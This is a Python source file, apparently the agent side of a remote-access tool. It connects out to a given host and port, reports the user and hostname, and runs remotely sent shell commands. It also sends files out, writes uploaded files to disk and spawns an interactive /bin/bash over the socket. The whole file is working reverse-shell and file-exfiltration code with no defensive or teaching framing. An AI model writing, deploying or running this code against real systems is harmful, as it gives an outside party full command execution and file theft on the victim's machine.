from argparse import ArgumentParser
from base64 import b64decode, b64encode
from cmd import Cmd
from getpass import getuser
from json import dumps, loads
from os import chdir, close, fdopen, getcwd, getuid, read, SEEK_END, write
from os.path import abspath, join
from pty import openpty
from select import select
from socket import AF_INET, gethostname, SHUT_RDWR, socket, SOCK_STREAM
from struct import pack, unpack
from subprocess import PIPE, Popen, STDOUT
from sys import version_info
from threading import Thread


class Packet():

    def __init__(self):
        self.action = None
        self._args = {}
        self.message = None
        self.warning = None
        self.error = None
        self.prompt = None

    def add_argument(self, name, value, base64_enc=True):
        if isinstance(value, str) and base64_enc:
            value = d(b64encode(b(value)))
        self._args[name] = value

    def dumps(self):
        p = {'action': self.action}
        if self._args:
            p['args'] = self._args
        if self.message:
            p['message'] = d(b64encode(b(self.message)))
        if self.warning:
            p['warning'] = d(b64encode(b(self.warning)))
        if self.error:
            p['error'] = d(b64encode(b(self.error)))
        if self.prompt:
            p['prompt'] = d(b64encode(b(self.prompt)))
        
        return dumps(p)

    def get_argument(self, name):
        return self._args.get(name)

    @staticmethod
    def loads(data):
        p = Packet()
        data = loads(data)
        p.action = data.get('action', '')
        p._args = data.get('args', {})
        return p


def b(s):
    if version_info[0] == 3:
        return s.encode('utf-8')
    else:
        return s


def d(s):
    if version_info[0] == 3:
        return s.decode('utf-8')
    else:
        return s


def command(cmd):
    p = Packet()
    p.action = 'cmd'

    pwd = None
    try:
        # Little hack to  know if the cwd has changed in the subprocess to 
        # propagate it to the parent process
        process = Popen(cmd + ' && pwd', shell=True, stdout=PIPE, stderr=PIPE)
        stdout, stderr = process.communicate()
        if stdout:
            out_lines = d(stdout).rsplit('\n', 2)[:-1]
            pwd = out_lines[-1]
            if len(out_lines) > 1:
                p.message = out_lines[-2]
        if stderr:
            p.error = d(stderr)
    except Exception as e:
        p.error = str(e)

    if pwd:
        chdir(pwd)
        p.prompt = get_prompt()

    send_packet(b(p.dumps()))


def download(path):
    p = Packet()
    p.action = 'download'

    try:
        with open(abspath(path), 'rb') as f:
            f.seek(0, SEEK_END)
            size = f.tell()
            p.add_argument('size', size)
            send_packet(b(p.dumps()))

            f.seek(0)
            while True:
                data = f.read(4096)
                if not data:
                    break
                send_packet(data)
                
    except Exception as e:
        p.error = str(e)
        send_packet(b(p.dumps()))


def get_prompt():
    return  '{}@{}:{}{}'.format(
        getuser(), gethostname(), getcwd(),
        '#' if getuid() == 0 else '$')


def interactive():
    global stop_interactive_mode
    stop_interactive_mode = False
    
    master, slave = openpty()
    p = Popen(['/bin/bash'], stdin=slave, stdout=slave, stderr=slave)

    read_thread = Thread(target=interactive_mode_read, args=(master,))
    write_thread = Thread(target=interactive_mode_write, args=(master,))
    read_thread.start()
    write_thread.start()

    p.wait()

    stop_interactive_mode = True

    read_thread.join()

    send_packet(b'\xbb')

    write_thread.join()

    close(slave)
    close(master)


def interactive_mode_read(master):
    while True:
        if select([master], [], [], 1.0)[0]:
            data = read(master, 1024)
            if not data:
                break
            send_packet(b'\xba' + data)
        elif stop_interactive_mode:
            break


def interactive_mode_write(master):
    while True:
        data = receive_packet()
        if not data:
            break
        write(master, data)


def upload(dest, filename, size):
    full_path = join(abspath(dest), filename)

    try:
        with open(full_path, 'wb') as f:
            p = Packet()
            p.action = 'upload'
            send_packet(b(p.dumps()))

            while size > 0:
                data = receive_packet()
                if not data:
                    exit(1)
                f.write(data)
                size -= len(data)
    except Exception as e:
        p = Packet()
        p.action = 'upload'
        p.error = str(e)
        send_packet(b(p.dumps()))
        return

    p = Packet()
    p.action = 'upload'
    p.message = full_path
    send_packet(b(p.dumps()))


def receive_packet_size():
    received_bytes = b''
    while len(received_bytes) < 4:
        data = sock.recv(4 - len(received_bytes))
        if not data:
            return None
        received_bytes += data
    return unpack('>I', received_bytes)[0]


def receive_data(size):
    received_bytes = b''
    while len(received_bytes) < size:
        data = sock.recv(size - len(received_bytes))
        if not data:
            return None
        received_bytes += data
    return received_bytes


def receive_packet():
    size = receive_packet_size()
    if size is None:
        return None
    message = receive_data(size)
    return message


def send_packet(data):
    size = pack('>I', len(data))
    sock.send(size)
    sock.send(data)


parser = ArgumentParser()
parser.add_argument('-H', '--host', type=str, required=True,
    help='Remote hostname or IP address to connect to')
parser.add_argument('-p', '--port', type=int, required=True,
    help='Remote port to connect to')
args = parser.parse_args()


sock = socket(AF_INET, SOCK_STREAM)
try:
    sock.connect((args.host, args.port))
    hello_packet = Packet()
    hello_packet.action = 'hello'
    hello_packet.add_argument('encryption', {'enabled': False, 'supported': False})
    hello_packet.add_argument('features', ['download', 'interactive', 'upload'])
    hello_packet.add_argument('os', 'Linux')
    hello_packet.prompt = get_prompt()
    send_packet(b(hello_packet.dumps()))

    while True:
        p = receive_packet()
        if p is None:
            break
        p = Packet.loads(p)
        if p.action == 'cmd':
            command(d(b64decode(p.get_argument('cmd'))))
        elif p.action == 'download':
            download(d(b64decode(p.get_argument('path'))))
        elif p.action == 'interactive':
            interactive()
        elif p.action == 'upload':
            upload(
                d(b64decode(p.get_argument('dest'))),
                d(b64decode(p.get_argument('filename'))),
                p.get_argument('size')
            )
finally:
    sock.shutdown(SHUT_RDWR)
    sock.close()